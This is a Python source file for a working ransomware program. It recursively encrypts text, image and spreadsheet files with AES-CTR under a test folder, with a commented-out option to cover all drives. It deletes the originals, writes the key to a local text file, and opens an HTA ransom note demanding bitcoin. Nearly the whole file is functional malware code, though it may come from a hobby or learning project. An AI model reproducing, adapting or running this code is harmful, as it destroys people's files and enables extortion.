from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.ciphers import (Cipher, algorithms, modes)
from base64 import b64decode, b64encode
import random
import os
from subprocess import Popen

class Ransomware():
    def __init__(self):
        chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
        self.uniqueIDKeyFile = ''.join(random.choice(chars) for _ in range(10)) + '.txt'
        self.backend = default_backend()
        self.key=os.urandom(32)
        self.nonce = os.urandom(16)
        # CTR mode does not require padding

    def encryptMethod(self, filename):
        self.cipher = Cipher(algorithms.AES(self.key), modes.CTR(self.nonce), backend=self.backend)
        self.filename=filename
        encryptor = self.cipher.encryptor()
        with open(self.uniqueIDKeyFile, 'wb') as k:
            k.write(b64encode(self.key))
            k.write(b'________')
            k.write(b64encode(self.nonce))

        chunksize = 64*1024
        outputFile = filename + ".Yo"
        with open(filename, 'rb') as infile:
            with open(outputFile, 'wb') as outfile:
                while True:
                    chunk = infile.read(chunksize)
                    if len(chunk) == 0:
                        break
                    elif len(chunk) % 16 != 0:
                            chunk += b' ' * (16 - (len(chunk) % 16))
                    try:
                        outfile.write(encryptor.update(chunk))
                    except ValueError as e:
                        break
        os.remove(self.filename)

    def ransomNote(self):

        note = b'''
<!DOCTYPE html>
<html lang='en'>
<head>
    <style>
        body {background: #a200bf; text-align: center;font-family: "Open Sans",  Impact;}
        .area {
          font-size: 6.5em;
          color: yellow;
          letter-spacing: -7px;
          font-weight: 700;
          text-transform: uppercase;
          text-shadow: 0px 0px 5px #fff, 0px 0px 7px #fff;
        }

    </style>
    <title>I have taken your Files for ransom!</title>
    <HTA:APPLICATION
        border="thin"
        windowState="maximize"
    />
</head>
<body>
    <div class="area">&#9888; ATTENTION &#9888;</div>
    <h1>I have encrypted your files</h1>
    <p>If you want to see your Files again, send <span style='font-size: 1.5em; font-style: oblique; color: white'>150 billion dollars</span> to this bitcoin address:</p>
    <code style='color: red; font-size: 1.5em'>1Ffj4NU32NscD4EWoiJOUcsdjn4ncNHG</code>
    <p>Then go to <span style='font-size: 1.80em'>IWontRunWindowsAgain.com</span>and download your decryption file!</p>
</body>
</html>'''
        with open('note.hta', 'wb') as rNote:
            rNote.write(note)
        Popen('note.hta', shell=True)

    def pathFinder(self):  # finds the drive letters to pass to os.walk as root directory
        allDrives = [chr(x) for x in range(66, 91)]
        availableDrives = []
        for a in allDrives:
            if os.path.exists(a+':\\'):
                availableDrives.append(a+':\\')
        return availableDrives

    def encryptAll(self):
        # encpath = self.pathFinder()
        encpath = ['C:\\Test']
        encryptExtensions = ['txt', 'png', 'jpeg', 'jpg', 'xlsx']
        for _ in encpath:
            for dirPath, dirName, files in os.walk(_):
               for myFile in files:
                    for e in encryptExtensions:
                        if myFile.endswith(e):
                            self.encryptMethod(os.path.abspath(os.path.join(dirPath, myFile)))
        self.ransomNote()            

RanInst=Ransomware()
#RanInst.ransomNote()
#print (RanInst.pathFinder())
RanInst.encryptAll()
